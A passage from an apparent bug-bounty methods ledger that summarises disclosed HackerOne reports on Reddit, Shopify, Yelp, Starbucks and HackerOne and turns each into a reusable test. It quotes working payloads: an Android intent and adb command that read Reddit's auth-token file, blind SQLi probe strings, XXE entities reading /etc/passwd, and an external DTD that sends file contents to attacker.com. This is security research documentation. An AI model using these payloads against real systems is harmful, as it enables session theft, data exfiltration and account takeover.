  3. THE POC (verbatim Java): `Intent intent = new Intent(); intent.setClassName("com.reddit.frontpage", "com.reddit.frontpage.RedditDeepLinkActivity"); intent.setData(Uri.parse("file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml")); startActivity(intent);` ("Replace UserName to victims username i.e. ...auth_active.**Strong-Sun628**.xml") -> "Once open third-party app, Reddit app opens InAppBrowser with auth_active file and its data contained token."
  4. THE ONE-LINE PROBE (verbatim shell): `adb shell am start -n "com.reddit.frontpage/com.reddit.frontpage.RedditDeepLinkActivity" -d "file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.frontpage_preferences.xml"` — the reporter states a complete POC (third-party app saves the files and sends them to an attacker server) is available on request.
DETECTION SIGNAL: an exported/routable activity (manifest intent-filter on VIEW / app links / custom schemes) that forwards the incoming URI to an in-app browser or WebView with NO scheme allowlist (`file://`, `content://`, `javascript:` accepted); an IAB/WebView that runs with the app's own file access. Tell: `adb shell am start -n <pkg>/<activity> -d "file:///data/data/<pkg>/shared_prefs/<anything>.xml"` renders the file instead of rejecting the scheme.
CHAIN: malicious third-party app on the device (or adb / physical access) fires the router with a `file://` URI at the victim app's `shared_prefs` auth XML (primitive: unvalidated scheme routing + IAB file access) -> the IAB renders the app-private file containing the session token (escalation: cross-app read of app-private auth material) -> token replay = login as the victim (impact: ATO / sensitive info disclosure with PoC; program rated medium). Per doctrine §8.4: precondition = a malicious app installed on the same device (or adb access), gain = the app's session token plus DB/cookies in cleartext.
TRANSFERABLE TEST: for every mobile app in scope handling deeplinks/URLs, list the exported routing activities (`adb shell dumpsys package <pkg> | grep -B2 -A6 'android.intent.action.VIEW'` / manifest intent-filters) and fire EACH with NON-HTTP schemes: `adb shell am start -n <pkg>/<activity> -d "file:///data/data/<pkg>/shared_prefs/<pkg>_preferences.xml"`, then `.../databases/<db>`, then `content://` and `javascript:` variants. If the app's own IAB/WebView renders the file, sweep `shared_prefs/*auth*.xml`, `shared_prefs/*token*`, `*.db`, cookie stores — the auth token lands on screen and is extractable (reporter's own escalation: save + exfiltrate). Rule: **a deeplink router with no scheme allowlist turns the app's own in-app browser into a privileged file reader — `file://` at `/data/data/<pkg>/` is an internal-file-read primitive and the token files are the prize.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.728 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: #1372667 (Basecamp, ledger 3326-3341 — deep-link `?proceed_to=` re-parsed redirect PARAM bypasses an internal-URL allowlist, the WebView loads attacker HTML and the JS↔native bridge sends the auth header to an attacker URL; scheme stays https, leak channel is the bridge); §17.363 (#2553411 Basecamp bc3 — deeplink `filename` param path traversal WRITES the victim's file into shared storage); #1378889 (Slack Android — SERVER-supplied upload filename WRITTEN into the app's own private prefs -> auth-token disclosure; ledger 17506: "a write into the app's private root reaches the app's own databases / shared_prefs / config files"); §17.58 / §17.149 / §17.324 (custom-scheme handlers as XSS->RCE delivery / param-eval sinks). NONE records a router that accepts `file://` and lets the app READ its own private files at a third-party app's request. Tokens `1122177|rahulkankrale|RedditDeepLink|auth_active|file:///data/data|shared_prefs|DeepLinkActivity` = 0 technique hits across the three write targets immediately before append (the single `shared_prefs` hit, ledger 17506, is the Slack Android WRITE entry).
FRESHNESS: submitted 2021-03-10, disclosed 2021-10-27 — OUTSIDE the preferred 6-12 month window (~5 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Android device, no Reddit app, no target touched this pass). Every quote above is verbatim from the fetched body (live `.json`, `vulnerability_information`, `visibility: full`); the video attachment {F1225199} was not viewed and nothing was invented for it.

STATUS: UNVERIFIED (not reproduced — no request was sent to any target this pass; every payload, the request shape and the TRUE/FALSE labels below are quoted verbatim from the fetched body)
CLASS: SQLi (boolean-blind detection method) — injection inside a JSON-encoded `extraParams` value of an ASP.NET AJAX DirectEvent postback, proved with SAME-LENGTH single-character TRUE/FALSE arithmetic probes (CWE-89). The assigned RCE label is corrected here: the body demonstrates SQLi; its only RCE mention is the generic impact sentence "Under the right circumstances, SQLi can also be used by an attacker to execute OS commands" — a claim, not a demonstration (doctrine §8.5).
CORE METHOD:
  1. THE ENTRY POINT (verbatim request shape): `POST /█████0` with `X-Requested-With: XMLHttpRequest`, `Cookie: ASP.NET_SessionId=███████`, `Content-Type: application/x-www-form-urlencoded`, body `██████&__EVENTARGUMENT=-%7Cpublic%7CGetDirs&__EVENTTARGET=ResourceManager1&__EVENTVALIDATION=…&__VIEWSTATE=█████&__VIEWSTATEENCRYPTED=&__VIEWSTATEGENERATOR=3257FB69&submitDirectEventConfig={"config":{"extraParams":{"sDirID":"-1%20OR%203*2*1=6%20AND%20000159=000159"}}}&txtSearchBox=the` — the injection lives in `submitDirectEventConfig` -> `config.extraParams.sDirID` ("JSON input █████ was set to -1 OR 3*2*1=6 AND 000159=000159"; "Original value: 51"), on a `ResourceManager1` `GetDirs` (directory-browser) handler of an ASP.NET WebForms page.
  2. THE PROBE LADDER (verbatim "Tests performed"): `-1 OR 2+159-159-1=0+0+0+1 => TRUE` / `-1 OR 3+159-159-1=0+0+0+1 => FALSE` / `-1 OR 3*2<(0+5+159-159) => FALSE` / `-1 OR 3*2>(0+5+159-159) => FALSE` / `-1 OR 2+1-1+1=1 AND 000159=000159 => FALSE` / `-1 OR 3*2=5 AND 000159=000159 => FALSE` / `-1 OR 3*2=6 AND 000159=000159 => TRUE` / `-1 OR 3*2*0=6 AND 000159=000159 => FALSE` / `-1 OR 3*2*1=6 AND 000159=000159 => TRUE`.
  3. THE CONSTRUCTION (the reusable kernel): every TRUE/FALSE pair is BYTE-LENGTH IDENTICAL and differs in EXACTLY ONE character (`2`->`3`, `5`->`6`, `1`->`0`); the tautology is digit-PADDED (`000159=000159`, not `1=1`); the left side is cancel-term arithmetic (`2+159-159-1=0+0+0+1`) keeping both variants the same shape; the arithmetic-EVAL probes (`3*2*1=6`) pass only if the database COMPUTES the expression — so the pair defeats regex tautology filters (`1=1`, `or true`) AND length/anomaly-based defenses, and the response difference can only come from SQL-side evaluation.
DETECTION SIGNAL: an AJAX/WebForms (or any RPC) request whose data values ride inside a JSON config blob (`submitDirectEventConfig`, `config.extraParams.*`, `extConfig`, DirectEvent / Ext.NET / Telerik / DevExpress postbacks) instead of top-level form fields — scanners fuzzing named form fields never touch them; a numeric param (`sDirID`, original value `51`) on a directory/file-browser handler (`GetDirs`, `ResourceManager1`); a response that flips state across a one-character-diff probe pair (rows vs no-rows, error vs clean).
CHAIN: attacker fuzzes the JSON `extraParams` values of the DirectEvent postback (primitive: SQLi in a parameter invisible to top-level field fuzzing) -> the one-character-diff TRUE/FALSE pairs yield a boolean oracle with zero error messages (escalation: blind SQLi confirmed through any filter that regexes `1=1`/`' or '` or compares lengths) -> standard blind extraction walks the DB row-by-row on the same hidden param (impact per the report's own text: "retrieve the contents of an entire database", "add, modify and delete records"; the OS-command sentence is a generic claim, flagged, not demonstrated).
TRANSFERABLE TEST: (1) on every ASP.NET/AJAX target, capture a DirectEvent-style postback (look for `__EVENTTARGET`, `__EVENTARGUMENT`, `submitDirectEventConfig`, `extConfig`, `dxCallback`, `rau`) and FUZZ EVERY VALUE INSIDE ITS JSON PAYLOAD (`config.extraParams.*`, nested `params`, `config.*`) — parse the blob, mutate one value at a time, re-POST the whole postback (with fresh `__VIEWSTATE`/`__EVENTVALIDATION`); (2) prove blind SQLi with length-identical one-char-diff arithmetic pairs in any suspected param: `…sDirID=-1 OR 3*2*1=6 AND 000159=000159` vs `…sDirID=-1 OR 3*2*0=6 AND 000159=000159`, using `2+159-159-1=0+0+0+1` cancel-term padding when the value must stay long; (3) diff the two responses byte-for-byte — a stable difference proves SQL evaluation even behind WAFs and length-matching defenses; (4) extract blind (`mid((select …),N,1)`) on the same hidden param. Rule: **the parameter is not always a form field — JSON config blobs inside framework postbacks are injection surface, and the proof pair should differ by exactly one character so the oracle cannot be noise.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.729 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: V-08 (Bugbountyskills 10485/10937 — "Transport-embedded parametric SQLi": values that reach SQL only inside JSON/XML/GraphQL bodies) is the GENERAL class; this adds the ASP.NET DirectEvent `submitDirectEventConfig.config.extraParams.*` carrier with its exact postback shape. The recorded tautology family: §17.700 (wrapper-BALANCED tautologies `')) or (('x'))=((('` for auth bypass + login-status oracle — wrapper depth, not byte length), the flat `' or 1=1` / `' AND 1=1-- -` vs `' AND 1=2-- -` pairs (ledger 641; Bugbountyskills 11929), the ArcGIS `where=1=1`/`1=0` record-count differential (ledger 19767), sqlmap-confirmed login-form SQLi declines (batch 163 Acronis #1436751, batch 265 #1069531) — none records the SAME-LENGTH single-character-diff construction with digit-padded tautologies (`000159=000159`) and cancel-term arithmetic padding, nor the arithmetic-EVAL proof (`3*2*1=6` passes only if the DB computes). The reporter's XOR-sleep family (the credited Medium writeup) is ALREADY recorded (ledger 6234-6239 InnoGames, §17.415, ledger 14425-14428) and is NOT re-recorded. Metadata: Shopify (team handle `shopify`, partners.shopify.com), "Add new managed stores without permission", weakness Improper Access Control - Generic, severity medium, reporter `jmp_35p`, created 2021-04-18, disclosed 2021-07-08, state Closed. The body notes "I can't tell if the issue I pointed out in #1167453 has the same root cause as this" (sibling report noted, not opened this pass).
STATUS: UNVERIFIED (not reproduced — no request was sent to Shopify or any target this pass; the request below is quoted verbatim from the fetched body)
CLASS: BAC / privilege escalation — a role permission named for ONE store subtype ("add, archive and unarchive development stores") is accepted by the SIBLING subtype's CREATE action ("add new managed stores"), and the create body carries a caller-nominated `permissions` grant array — a staff member performs an action that requires a permission they do not hold (CWE-863 / CWE-269)
CORE METHOD:
  1. THE PERMISSION GAP (verbatim): "A staff member who has permission to add, archive and unarchive development stores as shown in managedStoreA.png can also add new managed stores... A staff member with the said permission can access /organizationID/stores/create_managed_store endpoint as seen in managedStoreB.png."
  2. THE REQUEST (verbatim): `POST /100808/stores/create_managed_store HTTP/1.1` on `Host: partners.shopify.com` with `Accept: application/json`, `Content-Type: application/json`, `X-Requested-With: XMLHttpRequest`, `X-CSRF-Token: ...`, `Referer: https://partners.shopify.com/100808/stores/new?store_type=managed_store` and body `{"message":"","permissions":["applications","customers","dashboard","domains","draft_orders","edit_orders","gift_cards","links","locations","marketing","marketing_section","orders","overviews","pages","products","reports","themes","preferences","view_shopify_payments_payouts","view_billing_details","view_private_apps","edit_private_apps"],"store_domain":"myStore1","collaborator_access_code":""}` — the `permissions` array is the created store's grant list and includes payment/billing/private-app scopes (`view_shopify_payments_payouts`, `view_billing_details`, `edit_private_apps`), sent by the low-privilege staff member.
  3. THE IMPACT (verbatim): "Staff member can perform action that requires permission".
DETECTION SIGNAL: a role/permission panel granting "add <subtype A>" (development stores) while the API exposes a sibling `create_<subtype B>` route (`create_managed_store`) the same session can call — tell: the role's UI add-menu shows only subtype A while a direct POST to subtype B's create route returns 2xx; and a provision/create body containing a `permissions`/`grants`/`roles` array the created object actually carries.
CHAIN: staff member holding ONLY development-store add/archive/unarchive (primitive: the permission check scores the resource FAMILY, not the subtype — §17.602's rule on the ACTION side) -> direct `POST /<org>/stores/create_managed_store` passes (escalation: subtype-B create with no subtype-B grant) -> the body's `permissions:[...]` nominates the new store's grants incl. orders/customers/billing/payments-payouts/private-apps edit (escalation: the created object's authorization policy comes from the request) -> "Staff member can perform action that requires permission" (report's demonstrated terminal; program rated medium — the report claims no cross-org access and none is invented here).
TRANSFERABLE TEST: in every org/tenant panel with role-scoped permissions and MULTIPLE create/add actions over typed resources (development vs managed store, sandbox vs live, draft vs production, project vs workspace): (1) hold the LOWEST add permission and direct-POST every sibling create route (diff the role's UI menu against routes in the JS/network log — `create_managed_store`, `create_*`, `/new?store_type=`); (2) inspect each provision body for caller-nominated grant lists (`permissions:[...]`, `roles:[...]`, `scopes:[...]`, `admin:true`) and re-send with the MAXIMAL grant set, then read back the created object's effective grants; (3) if the server honours either, the provision path is self-granting. Rule: **a grant named "add <subtype A>" authorizes subtype A only if the check names the subtype — and a create request must never nominate its own permissions.**
DEDUPE/DELTA: DELTA entry (no §17 slot). Recorded neighbours REVIEWED and NOT conflated: §17.602 (Bugbountyskills.md 24382 — GitHub PAT: "WHERE TWO OBJECT TYPES SHARE ONE STORAGE/API SURFACE BUT THE PERMISSION MODEL SCORES THEM AS SEPARATE DIMENSIONS, THE AUTHORIZATION CHECK IS ONLY AS GOOD AS ITS TYPE DETECTION — TEST EVERY SHARED ROUTE WITH A TOKEN SCOPED TO THE WRONG SIBLING TYPE") owns the sibling-type permission-dimension RULE and the READ-side terminal; this entry adds the ACTION/CREATE-authorization terminal ("perform action that requires permission") with a full request shape and the second atom — the caller-nominated `permissions` array on the provision call (nearest recorded neighbour: bugbountyhuntingskills.md ~3482, privileged `trusted`/`skip_consent` flags smuggled into an OAuth app create/update body via parameter duplication — a hidden FLAG; here the grant list is an OPEN field the server should derive from policy, and the probe is "send the maximal list, read back the created object"). H1's own words: "The report is partially disclosed to anonymize the vendor."
STATUS: UNVERIFIED (not reproduced — no request was sent to events.hackerone.com or any target this pass; the exact `xss.xml` payload content is NOT in the public record and is not invented here)
CLASS: reflected XSS reached through a DOCUMENT-INGEST ENDPOINT — a vendor's XML "recording slides" endpoint takes a `url` parameter, fetches it server-side (full-read SSRF) and parses the fetched document as XML (XXE), and the processed output is rendered into a page on the company's subdomain (XSS). Recorded chain-first per the chain-only rule.
CORE METHOD:
  1. THE CARRIER (nagli summary, verbatim): "events.hackerone.com was pointing towards a 3rd party vendor as a CNAME, I managed to find a full read SSRF and XXE vulnerability on an endpoint which belongs to the vendor via get_recording_slides_xml.xml?url= endpoint that allowed me to achieve Reflected XSS on Hackerone's subdomain." Study framing (verbatim): "Vulnerability inheritance - Attacking companies and scoring bounties through 3rd party integrations".
  2. THE ENDPOINT (report title, verbatim via the index mirrors): "Reflected XSS and possible SSRF/XXE on https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml" — the parameter is `url`; the payload anchor is an XML document hosted by the attacker (`myserver/xss.xml`), fetched and parsed server-side.
  3. THE TRIAGE SUMMARY (HackerOne's own, verbatim): "@nagli found a reflected Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF), and XML External Entity (XXE) vulnerability in a 3rd party vendor that was used by HackerOne. This system did not contain any data related to reports submitted and stored on hackerone.com. HackerOne worked with the vendor to remediate the vulnerability. The report is partially disclosed to anonymize the vendor."
  4. WHAT IS NOT PUBLIC (stated, not filled in): how `xss.xml` converts the SSRF/XXE primitives into the reflected XSS (entity-read echoed into the slide page vs. script-bearing XML rendered into it) is in the withheld body — the transferable test decomposes all three primitives separately so the missing middle is never guessed. Public context only (not from the report): the vendor behind `events.hackerone.com` appears as `whitelabel.bigmarker.com` in the projectdiscovery/dnsx README's own examples — the CNAME carrier is observable in public DNS data.
DETECTION SIGNAL: a document/asset-processing endpoint whose parameter semantically names a RESOURCE TO FETCH (`url`, `src`, `file`, `href`, `slides`, `import`, `convert`, `xml`) on a host that is a CNAME to a SaaS/vendor; a response that comes back transformed (parsed/rendered document) rather than proxied; an OOB hit when the parameter points at your listener. Tell: `…/get_recording_slides_xml.xml?url=http://<your-server>/x.xml` fetches YOUR document and something derived from it lands in the response page.
CHAIN: in-scope subdomain CNAMEs to a third-party event/SaaS vendor (primitive: the vendor's app runs inside the company's origin and cookie scope — the §1.6 recorded trust-boundary finding) -> the vendor endpoint `…/conferences/get_recording_slides_xml.xml?url=<attacker XML>` is reachable under the company's own hostname (primitive: vulnerability inheritance — the vendor bug lands on the company's subdomain) -> the server fetches the attacker document (reporter verbatim: "full read SSRF") and parses it as XML (reporter verbatim: "XXE vulnerability") -> the processed output renders in the page (terminal, reporter verbatim: "allowed me to achieve Reflected XSS on Hackerone's subdomain" — script execution in the events.hackerone.com origin). Honest bound: H1 rated the report $0/none-set because the vendor system held "no data related to reports"; general escalation when the same endpoint sits on a data-bearing origin: XXE `file:///` read + cloud metadata via the SSRF leg.
TRANSFERABLE TEST: (1) resolve every in-scope subdomain and flag CNAMEs to SaaS/vendors (the §1.6 recorded recon step); (2) on those hosts, enumerate document-ingest endpoints (slide/deck/xml/svg/import/convert paths in JS, sitemaps, wayback) and feed each `url`-shaped parameter YOUR OWN hosted XML document; (3) decompose the primitive: does the server FETCH it (listener hit = SSRF), does it PARSE it (DOCTYPE external-entity callback fires = XXE), does anything DERIVED from it RENDER in the response (reflection = XSS); (4) when all three fire on one parameter the endpoint is a composed SSRF+XXE+XSS primitive — escalate with entity file reads (`<!DOCTYPE … [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`) and the RECORDED two-stage OOB external-DTD exfil (reuse the XXE ledger entries, do not re-derive). Rule: **a parameter that says "process this URL" is three primitives in one call — never test only the fetch.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.730 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: §1.6 (bugbountyhuntingskills.md 215-228) records THIS SAME study's carrier method from sibling report #1028332 (events.hackerone.com vendor CNAME trust boundary + stored-XSS/CSRF bridge back — "Report as 'vulnerability inheritance'") and is NOT re-taught here; §2.1 (#3165242 Lichess `players=[URL]`) records the url-param FETCH primitive only; the XXE carrier family (OOXML/SVG/metadata/form-field uploads + two-stage OOB external DTD) is recorded at the methodologies files — none records a document-ingest endpoint where ONE `url` parameter composes fetch + document-parse + render. Tokens `1028396|nagli|get_recording_slides_xml|slides_xml|xss\.xml|vulnerability inheritance` across the three write targets: the recorded §1.6 line (which uses the phrase "vulnerability inheritance" for #1028332), the dnsx-README `whitelabel.bigmarker.com` context line, and the same reporter's OTHER recorded report — bugbountyhuntingskills.md 9427-9440 (nagli #1342422 Basecamp NS-delegation subdomain takeover, a different technique) — reviewed and not conflated; 0 technique hits for this endpoint kernel.

ROUTE: body withheld on EVERY route (live `.json` = `visibility: no-content`, VI 0 B; web_extract + r.jina.ai = program summary + timeline only; ajaysenr/HackerOne-Disclosed-Reports mirror = "No vulnerability information available."). THE METHOD TEXT BELOW IS FROM THE PROGRAM SUMMARY (verbatim) + THE REPORT TITLE + third-party index corroboration (pwnpanda/Bug_Bounty_Reports row, verbatim: "card could be obtained through error messages on the `/profile_payment/save`endpoint by abusing an IDOR|$500|Yelp|https://hackerone.com/reports/361984"). Metadata: Yelp, weakness Insecure Direct Object Reference (IDOR), severity medium (CVSS 4.3 per mirror), reporter `hk755a`, created 2018-06-05, disclosed 2020-08-19, state Closed/Resolved, 31 votes.
STATUS: UNVERIFIED (not reproduced — no request was sent to Yelp or any target this pass; the reporter body is withheld, so the exact reference parameter name and request shape are NOT known and are not invented here)
CLASS: IDOR/BOLA on payment-method objects where the ERROR PATH is the read oracle — a save call referencing another user's payment object is refused, but the error message returns the foreign card's last four digits; per the report title the same reference also permitted EDITING other users' credit card information (recorded chain-first per the chain-only rule)
CORE METHOD:
  1. THE ENDPOINT AND THE LEAK (program summary, verbatim): "@hk755a discovered an Insecure Direct Object Reference Vulnerability that allowed an attacker to obtain the last four digits of a credit card that has been registered with the Yelp platform, through the error messages that the `/profile_payment/save` endpoint returned."
  2. THE OBJECT SWAP (index corroboration, verbatim): "card could be obtained through error messages on the `/profile_payment/save`endpoint by abusing an IDOR" — the save call references a payment object that is not the caller's; the reference parameter name is withheld with the body (not invented here).
  3. THE ORACLE MECHANISM: the authorization check refuses the write against the foreign object, but the ERROR STRING names the object's own fields (last four digits of the referenced card) — the object leaks through the FAILURE path even though the success path is blocked.
  4. THE WRITE LEG (report TITLE, verbatim — body withheld): "I.D.O.R TO EDIT ALL USER'S CREDIT CARD INFORMATION+(Partial credit card info disclosure)" — the title asserts the same IDOR permitted editing other users' credit card information; the request shape for the edit is in the withheld body and is not reconstructed here.
DETECTION SIGNAL: payment-method save/update/attach endpoints whose validation errors echo state of the REFERENCED object ("card ending 1234 …", "invalid CVV for card ****1234", "card … expired") when the submitted reference is not the caller's; error text that DIFFERS with the referenced object (found vs not found, brand names, digits) = read oracle even when every write is refused.
CHAIN: submit `POST /profile_payment/save` with a payment-object reference belonging to another user (primitive: IDOR — no ownership check on the reference) -> the write is refused but the ERROR names the foreign card's last four digits (impact 1: partial PCI/PII disclosure of a card "that has been registered with the Yelp platform" — the summary's own scope words, i.e. any platform card) -> per the title the same reference carries EDITS to the foreign card record (impact 2: cross-user payment-method tampering — monetary/account impact; claimed by the title, body withheld). Program rated medium 4.3, bounty paid — not inflated here.
TRANSFERABLE TEST: on every payment-method create/save/update/attach endpoint: (1) capture YOUR valid object reference (card id, payment-profile id, tokenized card ref); (2) submit an otherwise-valid body with a FOREIGN reference — enumerate ids, or reuse a reference harvested from a second account you own; (3) diff the ERROR text byte-for-byte against your own reference's errors — if the message names the foreign object's metadata (last-4, brand, expiry, status, holder name) the endpoint is a READ oracle despite refusing the write; (4) then vary write fields (name, billing address, default flag, CVV) against the foreign reference and verify the effect from the object owner's side (two accounts you control); (5) repeat on the DELETE/detach verb. Rule: **a refused write whose error names the foreign object's data is an IDOR READ, and a write that lands is payment tampering — the error path leaks object fields before authorization does.**
DEDUPE/DELTA: DELTA over the recorded "error path as oracle" rule and the recorded payment-IDOR family — no §17 slot. Recorded neighbours REVIEWED and NOT conflated: ledger §2.2 (#2262382 — "the application returned the fetched content inside an error message", SSRF error-oracle full-read; its NOTE explicitly keeps "the error message as response oracle" angle) owns the RULE "test the error path, not just the success path" — this entry is the IDOR/payment-object CARRIER of that rule with a documented partial-PCI terminal; ledger 3666-3669 (Shopify `BillingInvoice` GraphQL `node(id:)` swap -> cross-tenant invoice + card last-4/brand) reaches similar DATA via a direct object RETURN, not an error oracle; the "identity check accepts last-4" family (ledger 5633 / 22223) is the INVERSE (last-4 as a weak claimed factor), not a leak. Tokens `361984|hk755a|profile_payment|last.?four|credit card.{0,60}(IDOR|error)` across the three write targets: no technique hit for this method — the `last-4` hits are the Shopify BillingInvoice entry and the weak-identity-factor entries, and the `hk755a` hits are his OTHER recorded report (bugbountyhuntingskills.md 10347-10359, #271324 H1 homograph redirect-signature bypass, a different technique), reviewed and not conflated.

SOURCE: https://hackerone.com/reports/762251  2026-11-13 (anchor: program summary + metadata; body withheld) + METHOD WRITEUP: https://dev.to/rxkov/xxe-in-apis-discovering-hidden-xml-acceptance-and-exfiltrating-data-via-oob-2ilg  2026-11-13 (third-party methodology article documenting this report's surface; read IN FULL)
ROUTE: live `.json` = HTTP 200, `visibility: no-content` (VI 0 B — reporter body withheld); web_extract on the page = extractor error (transient 429), retried via https://r.jina.ai/https://hackerone.com/reports/762251 = WORKED (program summary + timeline + severity block); ajaysenr mirror corroborates metadata (Reporter `rugb`, High CVSS 7.5). The METHOD text below comes from the dev.to article (read in full this pass), which cites #762251 explicitly; the H1 body cannot corroborate its `Content-Type` detail and that is flagged per-claim.
STATUS: UNVERIFIED (not reproduced — no request was sent to starbucks.com.sg or any target this pass)
CLASS: XXE via PROTOCOL CONFUSION — a REST-style-named endpoint (`/RestApi/soap11`) that answers JSON in normal operation but runs a SOAP/XML stack; an XML `Content-Type` activates the parser and arbitrary server files can be read (CWE-611)
CORE METHOD:
  1. THE ANCHOR (Starbucks program summary, verbatim): "rugb discovered the endpoint at https://www.starbucks.com.sg/RestApi/* was found vulnerable to XML eXternal Entity (XXE) processing. This permitted arbitrary reading of files on the remote server. This asset is not rated as critical as it does not contain sensitive data." Metadata discrepancy recorded as-is: H1 `reporter` = `hiroot` (created 2019-12-20) while the program summary and the ajaysenr mirror credit `rugb` — both names appear in the public record; no reconciliation is invented.
  2. THE MECHANISM (dev.to article, verbatim): "The `/RestApi/soap11` endpoint used REST-style URL naming and returned JSON in normal responses, but the underlying protocol was SOAP. Sending `Content-Type: text/xml` activated the parser and the attacker read arbitrary files from the server." FLAGGED: this sentence is the ARTICLE's account of #762251 — the H1 body is withheld and cannot confirm the header detail; the program summary independently confirms XXE + arbitrary file read on `/RestApi/*`.
  3. THE PROBE (article's five-step, condensed with its verbatim triage): clone any JSON POST/PUT and switch `Content-Type: application/json` -> `application/xml` (or `text/xml` for SOAP), body `<root><key>value</key></root>`; "A 415 Unsupported Media Type response means rejection at the routing level before the parser is invoked. A 400 response with a parse error message confirms the XML parser was activated and the surface exists. A 200 response means the server accepted and processed the XML without complaint." Hunt SOAP hidden under REST: `Content-Type: text/xml` in captured traffic, the `?wsdl` suffix, paths `/service`, `/ws`, `/soap`, `/wsdl` (article, verbatim: "HackerOne #762251 showed that SOAP stacks fall outside the API inventory because developers assume only JSON endpoints exist").
  4. THE BLIND EXFIL (article): two-stage OOB external DTD — request `<!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]>`; hosted `evil.dtd` `<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % exfil "<!ENTITY transmit SYSTEM 'http://attacker.com/?x=%data;'>">%exfil;` ("parameter entities cannot reference other parameter entities within the same internal DTD subset" — the external DTD is what makes the chain work); OAST/interactsh catches DNS + HTTP. NOTE: this two-stage external-DTD shape is ALREADY recorded at the ledger's XXE entries (methodologies-2026-11-08 558-583 / methodologies-2026-11-13 878-879 / methodologies-2026-11-11 4257 / methodologies-2026-11-10 2572) — reuse it; this entry's new part is FINDING the hidden parser.
  5. THE SAML SURFACE (article): every SAML SP endpoint (`/sso`, `/saml/acs`, `/auth/saml/callback`) parses `SAMLResponse` BEFORE signature verification ("This is not a misconfiguration. It is the mandatory sequence of the protocol") — inject `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://callback.interactsh.com">]>` pre-auth; a DNS callback proves entity resolution without authentication.
DETECTION SIGNAL: an API route whose NAME or traffic hints a SOAP/XML stack under REST-style naming (`soap`, `asmx`, `.xml`, `?wsdl`, `text/xml` request/response content types) while the documented contract is JSON; a JSON endpoint answering 400-with-XML-parse-error (NOT 415) when sent minimal XML; parser-error text naming an XML library; frameworks auto-registering XML converters (Spring `MappingJackson2XmlHttpMessageConverter` when `jackson-dataformat-xml` is on the classpath — article, verbatim: "any endpoint annotated with `@RequestBody` can silently accept XML, even if the API contract declares only JSON").
CHAIN: a route returns JSON but runs an XML/SOAP stack (primitive: protocol confusion — invisible to a JSON-only API inventory) -> a `Content-Type: text/xml`/`application/xml` header activates the parser (bypass: one header, no route discovery, no auth change) -> the DOCTYPE/external entity is resolved (primitive: DTD resolution enabled) -> `file:///` arbitrary server file read (demonstrated terminal, program summary verbatim: "This permitted arbitrary reading of files on the remote server") -> blind variant exfils via the two-stage external DTD to OAST (escalation); per doctrine §4 the read reaches config/credential files (`web.config`, appsettings, `/etc/passwd`) -> internal SSRF leg (`http://localhost`, `169.254.169.254`) -> cloud creds/RCE. Program bound (verbatim): "This asset is not rated as critical as it does not contain sensitive data" — rated High 7.5, not inflated here.
TRANSFERABLE TEST: on every API surface: (1) replay each JSON POST/PUT as XML — `Content-Type: application/xml` (and `text/xml`), body `<root><k>v</k></root>` — triage by status: 415 = skip, 400 + XML parse error = CONFIRMED hidden parser, 200 = processed; (2) sweep SOAP-under-REST: URL names containing `soap`/`asmx`/`service`/`ws`, `?wsdl` probes, `text/xml` content types in captured traffic; (3) on each confirmed surface send `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<OAST>/probe">]>` — a DNS hit proves entity resolution; (4) blind -> two-stage external-DTD OOB exfil (recorded shape) reading `file:///etc/passwd`, `web.config`, then metadata-service URLs; (5) repeat PRE-AUTH on SAML ACS endpoints with a DOCTYPE-bearing `SAMLResponse`. Rule: **the API inventory lies — a route that speaks JSON can still run an XML stack, and the parser wakes on a header, not on a route.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.731 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: Bugbountyskills.md 15979-15987 ("Content-Type Switching (Bypassing Parser Protections)" — the one-line recipe "Change `application/json` to `application/xml` or `application/x-www-form-urlencoded` to trigger legacy parsers that lack security checks" with a role-escalation curl; that is a parser-BYPASS recipe, not the XXE-surface DETECTION probe with 415/400/200 triage, SOAP-under-REST discovery and the SAML pre-signature surface); the recorded XXE carrier family (OOXML `.pptx`/`.xlsx` parts, SVG converters, `LIBXML_NOENT` media metadata, `WebDocXML` form fields) and the two-stage OOB external-DTD EXFIL shape (methodologies-2026-11-08 558-583, methodologies-2026-11-13 878-879, methodologies-2026-11-11 4257, methodologies-2026-11-10 2572) — those are upload/form CARRIERS plus the exfil mechanism; this entry's new part is the DETECTION workflow for parsers hidden behind JSON contracts. Tokens `762251|hiroot|\brugb\b|soap11|hidden XML|two-stage OOB|external DTD` across the three write targets: only the recorded XXE entries above and a Norma recon note (`text/xml` response fingerprint) — none records the header-switch probe.
FRESHNESS: anchor report submitted 2019-12-20, disclosed 2020-07-22 — OUTSIDE the preferred 6-12 month window (~6 years) — BACKFILL, flagged; read because assigned. The METHOD WRITEUP is recent (its text cites CVE-2025-68493 and frames 2025 as "the real surface"; publication date not shown by the extractor; date read 2026-11-13).
HONESTY: not reproduced (no request sent to any target). The program-summary quotes are verbatim from the r.jina.ai rendering of the report page (the reporter body is withheld — `visibility: no-content` — on the live `.json`, and the ajaysenr mirror shows "No vulnerability information available."); the method steps are verbatim/condensed from the named dev.to article (read IN FULL this pass); the article's claim that `Content-Type: text/xml` was the activation vector in #762251 is the article's attribution and is flagged as uncorroborated by the withheld body.
